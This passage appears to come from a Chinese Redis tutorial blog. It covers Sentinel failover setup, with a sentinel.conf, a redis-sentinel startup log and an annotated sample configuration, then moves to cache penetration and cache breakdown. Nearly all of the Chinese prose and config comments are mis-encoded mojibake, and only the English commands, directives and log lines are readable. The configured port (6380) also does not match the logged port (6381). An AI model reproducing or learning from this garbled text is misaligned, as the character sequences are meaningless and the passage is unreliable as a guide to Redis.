<p>å‡è®¾ä¸»æœåŠ¡å™¨å®•æœºï¼Œå“¨å…µ1å…ˆæ£€æµ‹åˆ°è¿™ä¸ªç»“æœï¼Œç³»ç»Ÿå¹¶ä¸ä¼šé©¬ä¸Šè¿›è¡Œfailover[æ•…éšœè½¬ç§»]è¿‡ç¨‹ï¼Œä»…ä»…æ˜¯å“¨å…µ1ä¸»è§‚çš„è®¤ä¸ºä¸»æœåŠ¡å™¨ä¸å¯ç”¨ï¼Œè¿™ä¸ªç°è±¡æˆä¸º<strong>ä¸»è§‚ä¸‹çº¿</strong>ã€‚å½“åé¢çš„å“¨å…µä¹Ÿæ£€æµ‹åˆ°ä¸»æœåŠ¡å™¨ä¸å¯ç”¨ï¼Œå¹¶ä¸”æ•°é‡è¾¾åˆ°ä¸€å®šå€¼æ—¶ï¼Œé‚£ä¹ˆå“¨å…µä¹‹é—´å°±ä¼šè¿›è¡Œä¸€æ¬¡æŠ•ç¥¨ï¼ŒæŠ•ç¥¨çš„ç»“æœç”±ä¸€ä¸ªå“¨å…µå‘èµ·ï¼Œè¿›è¡Œfailoveræ“ä½œã€‚åˆ‡æ¢æˆåŠŸåï¼Œå°±ä¼šé€šè¿‡å‘å¸ƒè®¢é˜…æ¨¡å¼ï¼Œè®©å„ä¸ªå“¨å…µæŠŠè‡ªå·±ç›‘æ§çš„ä»æœåŠ¡å™¨å®ç°åˆ‡æ¢ä¸»æœºï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸º<strong>å®¢è§‚ä¸‹çº¿</strong>ã€‚</p>
<blockquote>
<p>æµ‹è¯•</p>
</blockquote>
<p>æˆ‘ä»¬ç›®å‰çš„çŠ¶æ€æ˜¯ ä¸€ä¸» ï¼ˆ6379ï¼‰äºŒä»ï¼ˆ6380ï¼Œ6381ï¼‰</p>
<p>æˆ‘ä»¬ç›®å‰çš„çŠ¶æ€æ˜¯ ä¸€ä¸» ï¼ˆ6379ï¼‰äºŒä»ï¼ˆ6380ï¼Œ6381ï¼‰</p>
<ol>
<li><p>æ–°å»ºå“¨å…µçš„é…ç½®æ–‡ä»¶sentinel.conf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sentinel monitor myredis 127.0.0.1 6380 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¯åŠ¨å“¨å…µ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/usr/local/bin<span class="comment"># redis-sentinel myconfig/sentinel.conf</span></span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.971 <span class="comment"># WARNING Memory overcommit must be enabled! Without it, a background save or replication may fail under low memory condition. Being disabled, it can also cause failures without low memory condition, see https://github.com/jemalloc/jemalloc/issues/1328. To fix this issue add &#x27;vm.overcommit_memory = 1&#x27; to /etc/sysctl.conf and then reboot or run the command &#x27;sysctl vm.overcommit_memory=1&#x27; for this to take effect.</span></span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.971 * oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.971 * Redis version=7.4.0, bits=64, commit=00000000, modified=1, pid=2239978, just started</span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.971 * Configuration loaded</span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.972 * Increased maximum number of open files to 10032 (it was originally <span class="built_in">set</span> to 1024).</span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.972 * monotonic clock: POSIX clock_gettime</span><br><span class="line">                _._                                                  </span><br><span class="line">           _.-``__ <span class="string">&#x27;&#x27;</span>-._                                             </span><br><span class="line">      _.-``    `.  `_.  <span class="string">&#x27;&#x27;</span>-._           Redis Community Edition      </span><br><span class="line">  .-`` .-```.  ```\/    _.,_ <span class="string">&#x27;&#x27;</span>-._     7.4.0 (00000000/1) 64 bit</span><br><span class="line"> (    <span class="string">&#x27;      ,       .-`  | `,    )     Running in sentinel mode</span></span><br><span class="line"><span class="string"> |`-._`-...-` __...-.``-._|&#x27;</span>` _.-<span class="string">&#x27;|     Port: 26379</span></span><br><span class="line"><span class="string"> |    `-._   `._    /     _.-&#x27;</span>    |     PID: 2239978</span><br><span class="line">  `-._    `-._  `-./  _.-<span class="string">&#x27;    _.-&#x27;</span>                                   </span><br><span class="line"> |`-._`-._    `-.__.-<span class="string">&#x27;    _.-&#x27;</span>_.-<span class="string">&#x27;|                                  </span></span><br><span class="line"><span class="string"> |    `-._`-._        _.-&#x27;</span>_.-<span class="string">&#x27;    |           https://redis.io       </span></span><br><span class="line"><span class="string">  `-._    `-._`-.__.-&#x27;</span>_.-<span class="string">&#x27;    _.-&#x27;</span>                                   </span><br><span class="line"> |`-._`-._    `-.__.-<span class="string">&#x27;    _.-&#x27;</span>_.-<span class="string">&#x27;|                                  </span></span><br><span class="line"><span class="string"> |    `-._`-._        _.-&#x27;</span>_.-<span class="string">&#x27;    |                                  </span></span><br><span class="line"><span class="string">  `-._    `-._`-.__.-&#x27;</span>_.-<span class="string">&#x27;    _.-&#x27;</span>                                   </span><br><span class="line">      `-._    `-.__.-<span class="string">&#x27;    _.-&#x27;</span>                                       </span><br><span class="line">          `-._        _.-<span class="string">&#x27;                                           </span></span><br><span class="line"><span class="string">              `-.__.-&#x27;</span>                                               </span><br><span class="line"></span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.980 * Sentinel new configuration saved on disk</span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.981 * Sentinel ID is dad236bacdf1f7ef1af264a564be5fc82681fa06</span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.981 <span class="comment"># +monitor master myredis 127.0.0.1 6381 quorum 1</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.052 <span class="comment"># +sdown master myredis 127.0.0.1 6381</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.052 <span class="comment"># +odown master myredis 127.0.0.1 6381 #quorum 1/1</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.052 <span class="comment"># +new-epoch 1</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.052 <span class="comment"># +try-failover master myredis 127.0.0.1 6381</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.061 * Sentinel new configuration saved on disk</span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.061 <span class="comment"># +vote-for-leader dad236bacdf1f7ef1af264a564be5fc82681fa06 1</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.061 <span class="comment"># +elected-leader master myredis 127.0.0.1 6381</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.061 <span class="comment"># +failover-state-select-slave master myredis 127.0.0.1 6381</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.133 <span class="comment"># -failover-abort-no-good-slave master myredis 127.0.0.1 6381</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.223 * Next failover delay: I will not start a failover before Sat Sep 21 17:03:26 2024</span><br></pre></td></tr></table></figure>
</li>
<li><p>è¿™ä¸ªæ—¶å€™masterå®•æœºäº†è¯ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šä»ä»æœºä¸­éšæœºé€‰æ‹©ä¸€ä¸ªæœåŠ¡å™¨ï¼ ï¼ˆè¿™é‡Œé¢æœ‰ä¸€ä¸ªæŠ•ç¥¨ç®—æ³•ï¼ï¼‰</p>
<p>ä¹Ÿå°±æ˜¯ä¹‹å‰é…ç½®æ–‡ä»¶ä¸­çš„æ‰€å†™å°†ä¼šå˜æˆmaster</p>
<p>å¹¶ä¸”å¦‚æœä¸»æœºæ­¤æ—¶å›æ¥äº†ï¼Œåªèƒ½å½’å¹¶åˆ°æ–°çš„ä¸»æœºä¸‹ï¼Œå½“åšä»æœºï¼Œè¿™å°±æ˜¯å“¨å…µæ¨¡å¼çš„è§„åˆ™</p>
</li>
</ol>
<blockquote>
<p>å“¨å…µæ¨¡å¼</p>
</blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ol>
<li>å“¨å…µé›†ç¾¤ï¼ŒåŸºäºä¸»ä»å¤åˆ¶æ¨¡å¼ï¼Œæ‰€æœ‰çš„ä¸»ä»é…ç½®ä¼˜ç‚¹ï¼Œå®ƒå…¨æœ‰</li>
<li>ä¸»ä»å¯ä»¥åˆ‡æ¢ï¼Œæ•…éšœå¯ä»¥è½¬ç§»ï¼Œç³»ç»Ÿçš„å¯ç”¨æ€§å°±ä¼šæ›´å¥½</li>
<li>å“¨å…µæ¨¡å¼å°±æ˜¯ä¸»ä»æ¨¡å¼çš„å‡çº§ï¼Œæ‰‹åŠ¨åˆ°è‡ªåŠ¨ï¼Œæ›´åŠ å¥å£®ï¼</li>
</ol>
<p>ç¼ºç‚¹ï¼š</p>
<ol>
<li>Redis ä¸å¥½åœ¨çº¿æ‰©å®¹çš„ï¼Œé›†ç¾¤å®¹é‡ä¸€æ—¦åˆ°è¾¾ä¸Šé™ï¼Œåœ¨çº¿æ‰©å®¹å°±ååˆ†éº»çƒ¦</li>
<li>å®ç°å“¨å…µæ¨¡å¼çš„é…ç½®å…¶å®æ˜¯å¾ˆéº»çƒ¦çš„ï¼Œé‡Œé¢æœ‰å¾ˆå¤šé€‰æ‹©</li>
</ol>
<p>å“¨å…µæ¨¡å¼çš„å…¨éƒ¨é…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Example sentinel.conf</span></span><br><span class="line"><span class="comment"># å“¨å…µsentinelå®ä¾‹è¿è¡Œçš„ç«¯å£ é»˜è®¤26379</span></span><br><span class="line">port 26379</span><br><span class="line"><span class="comment"># å“¨å…µsentinelçš„å·¥ä½œç›®å½•</span></span><br><span class="line"><span class="built_in">dir</span> /tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># å“¨å…µsentinelç›‘æ§çš„redisä¸»èŠ‚ç‚¹çš„ ip port</span></span><br><span class="line"><span class="comment"># master-name å¯ä»¥è‡ªå·±å‘½åçš„ä¸»èŠ‚ç‚¹åå­— åªèƒ½ç”±å­—æ¯A-zã€æ•°å­—0-9 ã€è¿™ä¸‰ä¸ªå­—ç¬¦&quot;.-_&quot;ç»„æˆ</span></span><br><span class="line"><span class="comment"># quorum é…ç½®å¤šå°‘ä¸ªsentinelå“¨å…µç»Ÿä¸€è®¤ä¸ºmasterä¸»èŠ‚ç‚¹å¤±è” é‚£ä¹ˆè¿™æ—¶å®¢è§‚ä¸Šè®¤ä¸ºä¸»èŠ‚ç‚¹å¤±è”äº†</span></span><br><span class="line"><span class="comment"># sentinel monitor &lt;master-name&gt; &lt;ip&gt; &lt;redis-port&gt; &lt;quorum&gt;</span></span><br><span class="line">sentinel monitor mymaster 127.0.0.1 6379 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># å½“åœ¨Rediså®ä¾‹ä¸­å¼€å¯äº†requirepass foobared æˆæƒå¯†ç  è¿™æ ·æ‰€æœ‰è¿æ¥Rediså®ä¾‹çš„å®¢æˆ·ç«¯éƒ½è¦æä¾›å¯†ç </span></span><br><span class="line"><span class="comment"># è®¾ç½®å“¨å…µsentinel è¿æ¥ä¸»ä»çš„å¯†ç  æ³¨æ„å¿…é¡»ä¸ºä¸»ä»è®¾ç½®ä¸€æ ·çš„éªŒè¯å¯†ç </span></span><br><span class="line"><span class="comment"># sentinel auth-pass &lt;master-name&gt; &lt;password&gt;</span></span><br><span class="line">sentinel auth-pass mymaster MySUPER--secret-0123passw0rd</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‡å®šå¤šå°‘æ¯«ç§’ä¹‹å ä¸»èŠ‚ç‚¹æ²¡æœ‰åº”ç­”å“¨å…µsentinel æ­¤æ—¶ å“¨å…µä¸»è§‚ä¸Šè®¤ä¸ºä¸»èŠ‚ç‚¹ä¸‹çº¿ é»˜è®¤30ç§’</span></span><br><span class="line"><span class="comment"># sentinel down-after-milliseconds &lt;master-name&gt; &lt;milliseconds&gt;</span></span><br><span class="line">sentinel down-after-milliseconds mymaster 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¸ªé…ç½®é¡¹æŒ‡å®šäº†åœ¨å‘ç”Ÿfailoverä¸»å¤‡åˆ‡æ¢æ—¶æœ€å¤šå¯ä»¥æœ‰å¤šå°‘ä¸ªslaveåŒæ—¶å¯¹æ–°çš„masterè¿›è¡Œ åŒæ­¥</span></span><br><span class="line"><span class="comment"># è¿™ä¸ªæ•°å­—è¶Šå°ï¼Œå®Œæˆfailoveræ‰€éœ€çš„æ—¶é—´å°±è¶Šé•¿ï¼Œ</span></span><br><span class="line"><span class="comment"># ä½†æ˜¯å¦‚æœè¿™ä¸ªæ•°å­—è¶Šå¤§ï¼Œå°±æ„å‘³ç€è¶Š å¤šçš„slaveå› ä¸ºreplicationè€Œä¸å¯ç”¨ã€‚</span></span><br><span class="line"><span class="comment"># å¯ä»¥é€šè¿‡å°†è¿™ä¸ªå€¼è®¾ä¸º 1 æ¥ä¿è¯æ¯æ¬¡åªæœ‰ä¸€ä¸ªslave å¤„äºä¸èƒ½å¤„ç†å‘½ä»¤è¯·æ±‚çš„çŠ¶æ€ã€‚</span></span><br><span class="line"><span class="comment"># sentinel parallel-syncs &lt;master-name&gt; &lt;numslaves&gt;</span></span><br><span class="line">sentinel parallel-syncs mymaster 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•…éšœè½¬ç§»çš„è¶…æ—¶æ—¶é—´ failover-timeout å¯ä»¥ç”¨åœ¨ä»¥ä¸‹è¿™äº›æ–¹é¢ï¼š</span></span><br><span class="line"><span class="comment">#1. åŒä¸€ä¸ªsentinelå¯¹åŒä¸€ä¸ªmasterä¸¤æ¬¡failoverä¹‹é—´çš„é—´éš”æ—¶é—´ã€‚</span></span><br><span class="line"><span class="comment">#2. å½“ä¸€ä¸ªslaveä»ä¸€ä¸ªé”™è¯¯çš„masteré‚£é‡ŒåŒæ­¥æ•°æ®å¼€å§‹è®¡ç®—æ—¶é—´ã€‚ç›´åˆ°slaveè¢«çº æ­£ä¸ºå‘æ­£ç¡®çš„masteré‚£ é‡ŒåŒæ­¥æ•°æ®æ—¶ã€‚</span></span><br><span class="line"><span class="comment">#3.å½“æƒ³è¦å–æ¶ˆä¸€ä¸ªæ­£åœ¨è¿›è¡Œçš„failoveræ‰€éœ€è¦çš„æ—¶é—´ã€‚</span></span><br><span class="line"><span class="comment">#4.å½“è¿›è¡Œfailoveræ—¶ï¼Œé…ç½®æ‰€æœ‰slavesæŒ‡å‘æ–°çš„masteræ‰€éœ€çš„æœ€å¤§æ—¶é—´ã€‚ä¸è¿‡ï¼Œå³ä½¿è¿‡äº†è¿™ä¸ªè¶…æ—¶ï¼Œ slavesä¾ç„¶ä¼šè¢«æ­£ç¡®é…ç½®ä¸ºæŒ‡å‘masterï¼Œä½†æ˜¯å°±ä¸æŒ‰parallel-syncsæ‰€é…ç½®çš„è§„åˆ™æ¥äº†</span></span><br><span class="line"><span class="comment"># é»˜è®¤ä¸‰åˆ†é’Ÿ</span></span><br><span class="line"><span class="comment"># sentinel failover-timeout &lt;master-name&gt; &lt;milliseconds&gt;</span></span><br><span class="line">sentinel failover-timeout mymaster 180000</span><br><span class="line"></span><br><span class="line"><span class="comment"># SCRIPTS EXECUTION</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#é…ç½®å½“æŸä¸€äº‹ä»¶å‘ç”Ÿæ—¶æ‰€éœ€è¦æ‰§è¡Œçš„è„šæœ¬ï¼Œå¯ä»¥é€šè¿‡è„šæœ¬æ¥é€šçŸ¥ç®¡ç†å‘˜ï¼Œä¾‹å¦‚å½“ç³»ç»Ÿè¿è¡Œä¸æ­£å¸¸æ—¶å‘é‚®ä»¶é€šçŸ¥ ç›¸å…³äººå‘˜ã€‚</span></span><br><span class="line"><span class="comment">#å¯¹äºè„šæœ¬çš„è¿è¡Œç»“æœæœ‰ä»¥ä¸‹è§„åˆ™ï¼š</span></span><br><span class="line"><span class="comment">#è‹¥è„šæœ¬æ‰§è¡Œåè¿”å›1ï¼Œé‚£ä¹ˆè¯¥è„šæœ¬ç¨åå°†ä¼šè¢«å†æ¬¡æ‰§è¡Œï¼Œé‡å¤æ¬¡æ•°ç›®å‰é»˜è®¤ä¸º10</span></span><br><span class="line"><span class="comment">#è‹¥è„šæœ¬æ‰§è¡Œåè¿”å›2ï¼Œæˆ–è€…æ¯”2æ›´é«˜çš„ä¸€ä¸ªè¿”å›å€¼ï¼Œè„šæœ¬å°†ä¸ä¼šé‡å¤æ‰§è¡Œã€‚</span></span><br><span class="line"><span class="comment">#å¦‚æœè„šæœ¬åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ç”±äºæ”¶åˆ°ç³»ç»Ÿä¸­æ–­ä¿¡å·è¢«ç»ˆæ­¢äº†ï¼Œåˆ™åŒè¿”å›å€¼ä¸º1æ—¶çš„è¡Œä¸ºç›¸åŒã€‚</span></span><br><span class="line"><span class="comment">#ä¸€ä¸ªè„šæœ¬çš„æœ€å¤§æ‰§è¡Œæ—¶é—´ä¸º60sï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªæ—¶é—´ï¼Œè„šæœ¬å°†ä¼šè¢«ä¸€ä¸ªSIGKILLä¿¡å·ç»ˆæ­¢ï¼Œä¹‹åé‡æ–°æ‰§è¡Œã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#é€šçŸ¥å‹è„šæœ¬:å½“sentinelæœ‰ä»»ä½•è­¦å‘Šçº§åˆ«çš„äº‹ä»¶å‘ç”Ÿæ—¶ï¼ˆæ¯”å¦‚è¯´rediså®ä¾‹çš„ä¸»è§‚å¤±æ•ˆå’Œå®¢è§‚å¤±æ•ˆç­‰ç­‰ï¼‰ï¼Œ å°†ä¼šå»è°ƒç”¨è¿™ä¸ªè„šæœ¬ï¼Œè¿™æ—¶è¿™ä¸ªè„šæœ¬åº”è¯¥é€šè¿‡é‚®ä»¶ï¼ŒSMSç­‰æ–¹å¼å»é€šçŸ¥ç³»ç»Ÿç®¡ç†å‘˜å…³äºç³»ç»Ÿä¸æ­£å¸¸è¿è¡Œçš„ä¿¡ æ¯ã€‚è°ƒç”¨è¯¥è„šæœ¬æ—¶ï¼Œå°†ä¼ ç»™è„šæœ¬ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯äº‹ä»¶çš„ç±»å‹ï¼Œä¸€ä¸ªæ˜¯äº‹ä»¶çš„æè¿°ã€‚å¦‚æœsentinel.confé… ç½®æ–‡ä»¶ä¸­é…ç½®äº†è¿™ä¸ªè„šæœ¬è·¯å¾„ï¼Œé‚£ä¹ˆå¿…é¡»ä¿è¯è¿™ä¸ªè„šæœ¬å­˜åœ¨äºè¿™ä¸ªè·¯å¾„ï¼Œå¹¶ä¸”æ˜¯å¯æ‰§è¡Œçš„ï¼Œå¦åˆ™sentinelæ—  æ³•æ­£å¸¸å¯åŠ¨æˆåŠŸã€‚</span></span><br><span class="line"><span class="comment">#é€šçŸ¥è„šæœ¬</span></span><br><span class="line"><span class="comment"># shellç¼–ç¨‹</span></span><br><span class="line"><span class="comment"># sentinel notification-script &lt;master-name&gt; &lt;script-path&gt;</span></span><br><span class="line">sentinel notification-script mymaster /var/redis/notify.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®¢æˆ·ç«¯é‡æ–°é…ç½®ä¸»èŠ‚ç‚¹å‚æ•°è„šæœ¬</span></span><br><span class="line"><span class="comment"># å½“ä¸€ä¸ªmasterç”±äºfailoverè€Œå‘ç”Ÿæ”¹å˜æ—¶ï¼Œè¿™ä¸ªè„šæœ¬å°†ä¼šè¢«è°ƒç”¨ï¼Œé€šçŸ¥ç›¸å…³çš„å®¢æˆ·ç«¯å…³äºmasteråœ°å€å·² ç»å‘ç”Ÿæ”¹å˜çš„ä¿¡æ¯ã€‚</span></span><br><span class="line"><span class="comment"># ä»¥ä¸‹å‚æ•°å°†ä¼šåœ¨è°ƒç”¨è„šæœ¬æ—¶ä¼ ç»™è„šæœ¬:</span></span><br><span class="line"><span class="comment"># &lt;master-name&gt; &lt;role&gt; &lt;state&gt; &lt;from-ip&gt; &lt;from-port&gt; &lt;to-ip&gt; &lt;to-port&gt;</span></span><br><span class="line"><span class="comment"># ç›®å‰&lt;state&gt;æ€»æ˜¯â€œfailoverâ€,</span></span><br><span class="line"><span class="comment"># &lt;role&gt;æ˜¯â€œleaderâ€æˆ–è€…â€œobserverâ€ä¸­çš„ä¸€ä¸ª</span></span><br><span class="line"><span class="comment"># å‚æ•° from-ip, from-port, to-ip, to-portæ˜¯ç”¨æ¥å’Œæ—§çš„masterå’Œæ–°çš„master(å³æ—§çš„slave)é€š ä¿¡çš„</span></span><br><span class="line"><span class="comment"># è¿™ä¸ªè„šæœ¬åº”è¯¥æ˜¯é€šç”¨çš„ï¼Œèƒ½è¢«å¤šæ¬¡è°ƒç”¨ï¼Œä¸æ˜¯é’ˆå¯¹æ€§çš„ã€‚</span></span><br><span class="line"><span class="comment"># sentinel client-reconfig-script &lt;master-name&gt; &lt;script-path&gt;</span></span><br><span class="line">sentinel client-reconfig-script mymaster /var/redis/reconfig.sh <span class="comment"># ä¸€èˆ¬éƒ½æ˜¯ç”±è¿ç»´æ¥é…ç½®ï¼</span></span><br></pre></td></tr></table></figure>

<h1 id="åäºŒã€redisç©¿é€å’Œé›ªå´©"><a href="#åäºŒã€redisç©¿é€å’Œé›ªå´©" class="headerlink" title="åäºŒã€redisç©¿é€å’Œé›ªå´©"></a>åäºŒã€redisç©¿é€å’Œé›ªå´©</h1><p>åœ¨è¿™é‡Œæˆ‘ä»¬ä¸ä¼šè¯¦ç»†çš„åŒºåˆ†æè§£å†³æ–¹æ¡ˆçš„åº•å±‚ï¼</p>
<p>Redisç¼“å­˜çš„ä½¿ç”¨ï¼Œæå¤§çš„æå‡äº†åº”ç”¨ç¨‹åºçš„æ€§èƒ½å’Œæ•ˆç‡ï¼Œç‰¹åˆ«æ˜¯æ•°æ®æŸ¥è¯¢æ–¹é¢ã€‚ä½†åŒæ—¶ï¼Œå®ƒä¹Ÿå¸¦æ¥äº†ä¸€äº›é—®é¢˜ã€‚å…¶ä¸­ï¼Œæœ€è¦å®³çš„é—®é¢˜ï¼Œå°±æ˜¯æ•°æ®çš„ä¸€è‡´æ€§é—®é¢˜ï¼Œä»ä¸¥æ ¼æ„ä¹‰ä¸Šè®²ï¼Œè¿™ä¸ªé—®é¢˜æ— è§£ã€‚å¦‚æœå¯¹æ•°æ®çš„ä¸€è‡´æ€§è¦æ±‚å¾ˆé«˜ï¼Œé‚£ä¹ˆå°±ä¸èƒ½ä½¿ç”¨ç¼“å­˜ã€‚</p>
<p>å¦å¤–çš„ä¸€äº›å…¸å‹é—®é¢˜å°±æ˜¯ï¼Œç¼“å­˜ç©¿é€ã€ç¼“å­˜é›ªå´©å’Œç¼“å­˜å‡»ç©¿ã€‚ç›®å‰ï¼Œä¸šç•Œä¹Ÿéƒ½æœ‰æ¯”è¾ƒæµè¡Œçš„è§£å†³æ–¹æ¡ˆã€‚</p>
<h2 id="1ã€ç¼“å­˜ç©¿é€ï¼ˆæŸ¥ä¸åˆ°ï¼‰"><a href="#1ã€ç¼“å­˜ç©¿é€ï¼ˆæŸ¥ä¸åˆ°ï¼‰" class="headerlink" title="1ã€ç¼“å­˜ç©¿é€ï¼ˆæŸ¥ä¸åˆ°ï¼‰"></a>1ã€ç¼“å­˜ç©¿é€ï¼ˆæŸ¥ä¸åˆ°ï¼‰</h2><blockquote>
<p>æ¦‚å¿µ</p>
</blockquote>
<p>ç¼“å­˜ç©¿é€çš„æ¦‚å¿µå¾ˆç®€å•ï¼Œç”¨æˆ·æƒ³è¦æŸ¥è¯¢ä¸€ä¸ªæ•°æ®ï¼Œå‘ç°rediså†…å­˜æ•°æ®åº“æ²¡æœ‰ï¼Œä¹Ÿå°±æ˜¯ç¼“å­˜æ²¡æœ‰å‘½ä¸­ï¼Œäºæ˜¯å‘æŒä¹…å±‚æ•°æ®åº“æŸ¥è¯¢ã€‚å‘ç°ä¹Ÿæ²¡æœ‰ï¼Œäºæ˜¯æœ¬æ¬¡æŸ¥è¯¢å¤±è´¥ã€‚å½“ç”¨æˆ·å¾ˆå¤šçš„æ—¶å€™ï¼Œç¼“å­˜éƒ½æ²¡æœ‰å‘½ä¸­ï¼ˆç§’æ€ï¼ï¼‰ï¼Œäºæ˜¯éƒ½å»è¯·æ±‚äº†æŒä¹…å±‚æ•°æ®åº“ã€‚è¿™ä¼šç»™æŒä¹…å±‚æ•°æ®åº“é€ æˆå¾ˆå¤§çš„å‹åŠ›ï¼Œè¿™æ—¶å€™å°±ç›¸å½“äºå‡ºç°äº†ç¼“å­˜ç©¿é€ã€‚</p>
<blockquote>
<p>è§£å†³æ–¹æ¡ˆ</p>
</blockquote>
<p><strong>1.å¸ƒéš†è¿‡æ»¤å™¨</strong></p>
<p>å¸ƒéš†è¿‡æ»¤å™¨æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œå¯¹æ‰€æœ‰å¯èƒ½æŸ¥è¯¢çš„å‚æ•°ä»¥hashå½¢å¼å­˜å‚¨ï¼Œåœ¨æ§åˆ¶å±‚å…ˆè¿›è¡Œæ ¡éªŒï¼Œä¸ç¬¦åˆåˆ™ä¸¢å¼ƒï¼Œä»è€Œé¿å…äº†å¯¹åº•å±‚å­˜å‚¨ç³»ç»Ÿçš„æŸ¥è¯¢å‹åŠ›ï¼›</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/c2dbc2632d43d48162bbc838fa569704--36d1--image-20240921190220109.png" alt="image-20240921190220109"></p>
<p><strong>2.ç¼“å­˜ç©ºå¯¹è±¡</strong></p>
<p>å½“å­˜å‚¨å±‚ä¸å‘½ä¸­åï¼Œå³ä½¿è¿”å›çš„ç©ºå¯¹è±¡ä¹Ÿå°†å…¶ç¼“å­˜èµ·æ¥ï¼ŒåŒæ—¶ä¼šè®¾ç½®ä¸€ä¸ªè¿‡æœŸæ—¶é—´ï¼Œä¹‹åå†è®¿é—®è¿™ä¸ªæ•°æ®å°†ä¼šä»ç¼“å­˜ä¸­è·å–ï¼Œä¿æŠ¤äº†åç«¯æ•°æ®æºï¼›</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/8033f6c667202d1b6b3e47451742523d--795d--image-20240921190233789.png" alt="image-20240921190233789"></p>
<p>ä½†æ˜¯è¿™ç§æ–¹æ³•ä¼šå­˜åœ¨ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>å¦‚æœç©ºå€¼èƒ½å¤Ÿè¢«ç¼“å­˜èµ·æ¥ï¼Œè¿™å°±æ„å‘³ç€ç¼“å­˜éœ€è¦æ›´å¤šçš„ç©ºé—´å­˜å‚¨æ›´å¤šçš„é”®ï¼Œå› ä¸ºè¿™å½“ä¸­å¯èƒ½ä¼šæœ‰å¾ˆå¤šçš„ç©ºå€¼çš„é”®</li>
<li>å³ä½¿å¯¹ç©ºå€¼è®¾ç½®äº†è¿‡æœŸæ—¶é—´ï¼Œè¿˜æ˜¯ä¼šå­˜åœ¨ç¼“å­˜å±‚å’Œå­˜å‚¨å±‚çš„æ•°æ®ä¼šæœ‰ä¸€æ®µæ—¶é—´çª—å£çš„ä¸ä¸€è‡´ï¼Œè¿™å¯¹äºéœ€è¦ä¿æŒä¸€è‡´æ€§çš„ä¸šåŠ¡ä¼šæœ‰å½±å“</li>
</ol>
<h2 id="2ã€ç¼“å­˜å‡»ç©¿"><a href="#2ã€ç¼“å­˜å‡»ç©¿" class="headerlink" title="2ã€ç¼“å­˜å‡»ç©¿"></a>2ã€ç¼“å­˜å‡»ç©¿</h2><blockquote>
<p>æ¦‚è¿°ï¼ˆçƒ­ç‚¹keyè¿‡æœŸï¼‰</p>
</blockquote>
<p>è¿™é‡Œéœ€è¦æ³¨æ„å’Œç¼“å­˜å‡»ç©¿çš„åŒºåˆ«ï¼Œç¼“å­˜å‡»ç©¿ï¼Œæ˜¯æŒ‡ä¸€ä¸ªkeyéå¸¸çƒ­ç‚¹ï¼Œåœ¨ä¸åœçš„æ‰›ç€å¤§å¹¶å‘ï¼Œå¤§å¹¶å‘é›†ä¸­ã€å¯¹è¿™ä¸€ä¸ªç‚¹è¿›è¡Œè®¿é—®ï¼Œå½“è¿™ä¸ªkeyåœ¨å¤±æ•ˆçš„ç¬é—´ï¼ŒæŒç»­çš„å¤§å¹¶å‘å°±ç©¿ç ´ç¼“å­˜ï¼Œç›´æ¥è¯·æ±‚æ•°æ®åº“ï¼Œå°±åƒåœ¨ä¸€ä¸ªå±éšœä¸Šå‡¿å¼€äº†ä¸€ä¸ªæ´ã€‚</p>
<p>å½“æŸä¸ªkeyåœ¨è¿‡æœŸçš„ç¬é—´ï¼Œæœ‰å¤§é‡çš„è¯·æ±‚å¹¶å‘è®¿é—®ï¼Œè¿™ç±»æ•°æ®ä¸€èˆ¬æ˜¯çƒ­ç‚¹æ•°æ®ï¼Œç”±äºç¼“å­˜è¿‡æœŸï¼Œä¼šåŒæ—¶è®¿é—®æ•°æ®åº“æ¥æŸ¥è¯¢æœ€æ–°æ•°æ®ï¼Œå¹¶ä¸”å›å†™ç¼“å­˜ï¼Œä¼šå¯¼ä½¿æ•°æ®åº“ç¬é—´å‹åŠ›è¿‡å¤§</p>
<blockquote>
<p> è§£å†³æ–¹æ¡ˆ</p>
</blockquote>
<p><strong>1.è®¾ç½®çƒ­ç‚¹æ•°æ®æ°¸ä¸è¿‡æœŸ</strong></p>
